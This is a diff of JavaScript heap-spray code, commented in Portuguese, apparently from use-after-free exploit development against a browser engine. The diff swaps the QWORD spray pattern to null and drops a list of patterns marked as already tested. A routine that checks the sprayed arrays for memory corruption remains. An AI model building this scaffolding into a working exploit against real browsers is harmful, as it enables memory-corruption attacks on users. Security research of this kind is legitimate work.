@@ -5,14 +5,8 @@ let uafCoreLogicHasRun = false;
 let sprayArraysGlobalRef = null;
 
 // ##################################################################################
-// # MODIFIQUE AQUI O PADRÃO DE SPRAY PARA CADA TESTE                               #
-// # Exemplos de padrões QWORD (8 bytes, little-endian):                            #
-const currentSprayPattern = [0xEF, 0xBE, 0xAD, 0xDE, 0xEF, 0xBE, 0xAD, 0xDE];
-// # const currentSprayPattern = [0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42]; // QWORD 0x42... - Já testado
-//  # const currentSprayPattern = [0xFE, 0xBE, 0xAD, 0xDE, 0xFE, 0xBE, 0xAD, 0xDE]; // QWORD 0xDEADBEEFDEADBEEF - Já testado
-//  # const currentSprayPattern = [0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]; // QWORD 0 (Nulo)Já testado
- //  # const currentSprayPattern = [0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]; // QWORD 7 (Pequeno, ímpar, possível ponteiro desalinhado/inválido) Já testado
-const currentSprayPattern = [0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]; // QWORD -1 (0xFF...FF)
+// # PADRÃO DE SPRAY PARA ESTE TESTE: QWORD 0 (Ponteiro Nulo)                     #
+const currentSprayPattern = [0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]; // QWORD 0
 // ##################################################################################
 
 function heapSpray() {
@@ -46,7 +40,7 @@ function verifySprayCorruption() {
         const arr = sprayArraysGlobalRef[arrayIndex];
         let isCorrupted = false;
         for (let i = 0; i < arr.length; i++) {
-            if (arr[i] !== currentSprayPattern[i % currentSprayPattern.length]) { // Usa currentSprayPattern para verificação
+            if (arr[i] !== currentSprayPattern[i % currentSprayPattern.length]) {
                 debug_log(`  CORRUPÇÃO DETECTADA no array do spray #${arrayIndex} no índice ${i}! Esperado: ${toHex(currentSprayPattern[i % currentSprayPattern.length], 8)}, Encontrado: ${toHex(arr[i], 8)}`);
                 isCorrupted = true;
                 corruptedCount++;
